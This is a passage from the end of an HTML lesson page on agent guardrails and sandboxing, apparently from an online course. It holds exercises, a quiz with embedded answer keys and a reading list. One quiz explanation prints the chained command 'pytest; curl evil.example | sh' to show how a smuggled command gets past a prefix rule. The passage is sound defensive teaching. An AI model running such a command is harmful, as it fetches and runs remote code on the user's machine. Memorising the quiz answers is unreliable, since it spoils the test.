+<li><strong>Add a spend cap and rate limit (medium).</strong> Extend <code>PolicyExecutor</code> with per-tool rate limits (e.g., <code>send_email</code> at most 5 per hour) and a session-level token budget that turns every verdict into &quot;deny&quot; once exceeded. Log the cap events to the audit trail and write a verification function that walks the hash chain and detects tampering.</li>
+<li><strong>Build an egress-proxied sandbox (medium–hard).</strong> Using Docker, create an internal network, a small forward proxy that allows only <code>pypi.org</code> and <code>files.pythonhosted.org</code>, and a sandbox container that can <code>pip install requests</code> but cannot <code>curl https://example.com</code>. Then add header injection for one API so the sandbox can call it without ever holding the key.</li>
+<li><strong>Evaluate a guardrail (hard).</strong> Assemble 200 benign tool outputs from your domain (including some that <em>discuss</em> prompt injection) and 100 injection attempts. Measure an open injection classifier&#39;s precision and recall at three thresholds. Decide which threshold you&#39;d ship and what action (log, flag, block, ask) each score band triggers.</li>
+</ol>
+<h2 id="check-your-understanding"><a class="anchor" href="#check-your-understanding" aria-hidden="true">#</a>Check Your Understanding</h2>
+<div class="quiz" data-quiz="guardrails-and-sandboxing" data-total="6">
+
+<div class="quiz-q" data-correct="3">
+  <div class="quiz-question"><span class="quiz-num">1</span><div>Why should the strongest guarantees in an agent&#39;s security design live in deterministic layers rather than LLM-based guardrails?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>Deterministic layers have no false positives</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>Regulators require deterministic controls</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>LLM-based guardrails are too expensive to run in production</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>An LLM-based guardrail can be manipulated by the same untrusted text it inspects, whereas a network policy or permission rule cannot be argued with</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> Classifiers and LLM judges are probabilistic and themselves susceptible to adversarial inputs. Sandboxes and permission checks in code enforce limits regardless of what the model was persuaded to do.</div>
+</div>
+
+<div class="quiz-q" data-correct="3">
+  <div class="quiz-question"><span class="quiz-num">2</span><div>A rule set contains allow &quot;bash: git *&quot; and deny &quot;bash: git push *&quot;. The agent proposes <code>git push origin main</code>. With correct precedence, what happens?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>Asked, because the rules conflict</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>Allowed, because the allow rule appears first</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>Allowed, because the more general rule wins</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>Denied, because deny takes precedence over allow</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> Deny-first precedence ensures a specific prohibition can&#39;t be silently overridden by a broad allowance. Order in the file shouldn&#39;t matter.</div>
+</div>
+
+<div class="quiz-q" data-correct="0">
+  <div class="quiz-question"><span class="quiz-num">3</span><div>Why does the example executor force &quot;ask&quot; when a shell command contains characters like <code>;</code>, <code>|</code> or <code>$</code>?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>Chaining and substitution let a command match an allowed prefix while executing something else entirely</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>They indicate the model is hallucinating</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>Those characters cause syntax errors in bash</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>Glob patterns cannot contain those characters</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> <code>pytest; curl evil.example | sh</code> matches an allow rule for <code>pytest*</code>. Prefix-matching shell strings is only meaningful for simple commands; anything compound needs human review or a stronger sandbox.</div>
+</div>
+
+<div class="quiz-q" data-correct="2">
+  <div class="quiz-question"><span class="quiz-num">4</span><div>What is the main security difference between a standard Docker container and a Firecracker microVM?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>Containers cannot limit memory usage</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>MicroVMs cannot run Linux workloads</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>Containers share the host kernel, while each microVM runs its own guest kernel behind a hypervisor</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>Containers have no filesystem isolation</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> Kernel sharing means a kernel vulnerability can become a container escape. MicroVMs (and, differently, gVisor) put a much stronger boundary between untrusted code and the host kernel.</div>
+</div>
+
+<div class="quiz-q" data-correct="2">
+  <div class="quiz-question"><span class="quiz-num">5</span><div>What does credential injection via an egress proxy achieve?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>It lets the agent choose which credentials to use per request</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>It encrypts the agent&#39;s tool calls</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>The agent can use an API without ever seeing the secret, so a compromised agent cannot leak it</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>It removes the need for network allowlists</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> The proxy outside the sandbox adds the token only for allowlisted destinations. The secret never enters the agent&#39;s context, filesystem or memory.</div>
+</div>
+
+<div class="quiz-q" data-correct="3">
+  <div class="quiz-question"><span class="quiz-num">6</span><div>Users approve nearly every permission prompt from your coding agent without reading them. What&#39;s the best response?</div></div>
+  <div class="quiz-options" role="group">
+    <button type="button" class="quiz-opt" data-i="0"><span class="quiz-letter">A</span><span>Require users to type the full command to approve</span></button>
+    <button type="button" class="quiz-opt" data-i="1"><span class="quiz-letter">B</span><span>Add more prompts so users pay more attention</span></button>
+    <button type="button" class="quiz-opt" data-i="2"><span class="quiz-letter">C</span><span>Remove all prompts and allow everything</span></button>
+    <button type="button" class="quiz-opt" data-i="3"><span class="quiz-letter">D</span><span>Strengthen sandboxing so routine actions are safe to auto-allow, and reserve prompts for genuinely consequential actions</span></button>
+  </div>
+  <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> Approval fatigue turns prompts into noise. Containing routine actions in a sandbox lets you safely allow them, so the prompts that remain carry meaning.</div>
+</div>
+<div class="quiz-footer"><div class="quiz-score" aria-live="polite"></div><button type="button" class="btn btn-ghost quiz-reset">Reset quiz</button></div>
+</div><h2 id="further-reading"><a class="anchor" href="#further-reading" aria-hidden="true">#</a>Further Reading</h2>
+<ul>
+<li><a href="https://gvisor.dev/docs/" target="_blank" rel="noopener">gVisor documentation</a> — architecture of the user-space kernel and its security model.</li>
+<li><a href="https://firecracker-microvm.github.io/" target="_blank" rel="noopener">Firecracker</a> — AWS&#39;s microVM monitor; the design docs explain the minimal device model.</li>
+<li><a href="https://docs.docker.com/engine/security/" target="_blank" rel="noopener">Docker Engine security</a> — capabilities, seccomp, user namespaces and rootless mode.</li>
+<li><a href="https://arxiv.org/abs/2312.06674" target="_blank" rel="noopener">Llama Guard: LLM-based Input-Output Safeguard (Inan et al., 2023)</a> — the original Llama Guard paper and its taxonomy-driven approach.</li>
+<li><a href="https://arxiv.org/abs/2310.10501" target="_blank" rel="noopener">NeMo Guardrails (Rebedea et al., 2023)</a> — programmable rails for LLM applications.</li>
+<li><a href="https://arxiv.org/abs/2501.18837" target="_blank" rel="noopener">Constitutional Classifiers (Anthropic, 2025)</a> — defending against universal jailbreaks with constitution-trained classifiers, including large-scale red teaming.</li>
+<li><a href="https://docs.anthropic.com/en/docs/claude-code/overview" target="_blank" rel="noopener">Claude Code documentation</a> — permission rules, hooks and sandboxing in a production coding agent.</li>
+<li><a href="https://www.openpolicyagent.org/docs/latest/" target="_blank" rel="noopener">Open Policy Agent</a> — a general-purpose policy engine widely used for authorization decisions.</li>
+<li><a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">OWASP Top 10 for LLM Applications</a> — especially Excessive Agency, Improper Output Handling and Unbounded Consumption.</li>
+</ul>
+
+  </article>
+  <section class="complete-box">
+    <div><h3>Finished this lesson?</h3><p>Mark it complete to track your progress. Your progress is saved in this browser.</p></div>
+    <button type="button" class="btn btn-primary complete-btn" data-slug="guardrails-and-sandboxing">Mark as complete</button>
+  </section>
+  <section class="notes-box">
+    <label for="notes-guardrails-and-sandboxing"><strong>📝 Your notes</strong> <small>(saved automatically in your browser)</small></label>
+    <textarea id="notes-guardrails-and-sandboxing" class="notes" data-slug="guardrails-and-sandboxing" rows="4" placeholder="Jot down insights, questions, ideas to try…"></textarea>
+  </section>
+  <nav class="pager">
+    <a class="pager-prev" href="agent-security.html"><small>← Previous</small><span>Agent Security &amp; Prompt Injection</span></a>
+    <a class="pager-next" href="agent-safety-alignment.html"><small>Next →</small><span>Safety, Alignment &amp; Governance</span></a>
+  </nav>
+</main>
+<aside class="toc" aria-label="On this page"><div class="toc-inner"><h4>On this page</h4><ul>
+<li class="toc-h2"><a href="#defense-in-depth">Defense in Depth</a></li>
+<li class="toc-h2"><a href="#input-guardrails">Input Guardrails</a></li>
+<li class="toc-h3"><a href="#placement-and-latency">Placement and latency</a></li>
+<li class="toc-h2"><a href="#output-guardrails">Output Guardrails</a></li>
+<li class="toc-h2"><a href="#the-guardrail-toolbox">The Guardrail Toolbox</a></li>
+<li class="toc-h2"><a href="#action-level-guardrails">Action-Level Guardrails</a></li>
+<li class="toc-h3"><a href="#permission-systems-allow-ask-deny">Permission systems: allow, ask, deny</a></li>
+<li class="toc-h3"><a href="#a-policy-checked-tool-executor">A policy-checked tool executor</a></li>
+<li class="toc-h3"><a href="#policy-engines">Policy engines</a></li>
+<li class="toc-h3"><a href="#hooks">Hooks</a></li>
+<li class="toc-h3"><a href="#rate-limits-and-spend-caps">Rate limits and spend caps</a></li>
+<li class="toc-h2"><a href="#sandboxing">Sandboxing</a></li>
+<li class="toc-h3"><a href="#the-isolation-spectrum">The isolation spectrum</a></li>
+<li class="toc-h3"><a href="#filesystem-scoping">Filesystem scoping</a></li>
+<li class="toc-h3"><a href="#network-egress-allowlists">Network egress allowlists</a></li>
+<li class="toc-h3"><a href="#credential-isolation-via-proxies">Credential isolation via proxies</a></li>
+<li class="toc-h3"><a href="#resource-and-time-limits">Resource and time limits</a></li>
+<li class="toc-h3"><a href="#ephemeral-environments">Ephemeral environments</a></li>
+<li class="toc-h3"><a href="#a-hardened-docker-run">A hardened docker run</a></li>
+<li class="toc-h2"><a href="#secure-by-default-configuration">Secure-by-Default Configuration</a></li>
+<li class="toc-h2"><a href="#auditing">Auditing</a></li>
+<li class="toc-h2"><a href="#the-safetyusefulness-trade-off">The Safety–Usefulness Trade-off</a></li>
+<li class="toc-h2"><a href="#key-takeaways">Key Takeaways</a></li>
+<li class="toc-h2"><a href="#exercises">Exercises</a></li>
+<li class="toc-h2"><a href="#check-your-understanding">Check Your Understanding</a></li>
+<li class="toc-h2"><a href="#further-reading">Further Reading</a></li>
+</ul></div></aside>
+</div>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-brand"><a class="brand" href="index.html"><svg viewBox="0 0 32 32" width="26" height="26" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7c5cff"/><stop offset="1" stop-color="#22c3ee"/></linearGradient></defs><rect x="2" y="2" width="28" height="28" rx="8" fill="url(#lg)"/><path d="M10 21.5 16 9l6 12.5M12.3 17h7.4" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/><circle cx="23.5" cy="9.5" r="2.2" fill="#fff"/></svg><span>Agent Academy</span></a>
+      <p>A free, open, comprehensive course on AI agents — from first principles to production and the research frontier.</p></div>
+    <div class="footer-cols">
+      <div><h4>Learn</h4><a href="curriculum.html">Curriculum</a><a href="paths.html">Learning paths</a><a href="lab.html">Interactive lab</a></div>
+      <div><h4>Practice</h4><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice exam</a><a href="progress.html">Your progress</a></div>
+      <div><h4>Reference</h4><a href="glossary.html">Glossary</a><a href="papers.html">Reading list</a><a href="cheatsheet.html">Cheat sheet</a><a href="about.html">About</a></div>
+    </div>
+  </div>
+  <p class="footer-note">Content current as of November 2026. The field moves fast — principles age slower than product names. Progress is stored only in your browser.</p>
+</footer>
+<div class="search-modal" hidden role="dialog" aria-modal="true" aria-label="Search">
+  <div class="search-panel">
+    <div class="search-input-row"><svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M11 4a7 7 0 1 0 0 14 7 7 0 0 0 0-14zm9 16-4.3-4.3"/></svg><input type="search" placeholder="Search lessons, glossary, papers…" aria-label="Search" autocomplete="off"><kbd>Esc</kbd></div>
+    <div class="search-results" role="listbox"></div>
+    <div class="search-hint"><span><kbd>↑</kbd><kbd>↓</kbd> navigate</span><span><kbd>↵</kbd> open</span><span><kbd>Esc</kbd> close</span></div>
+  </div>
+</div>
+<script src="assets/course-data.js"></script>
+<script src="assets/app.js"></script>
+
+</body>
+</html>
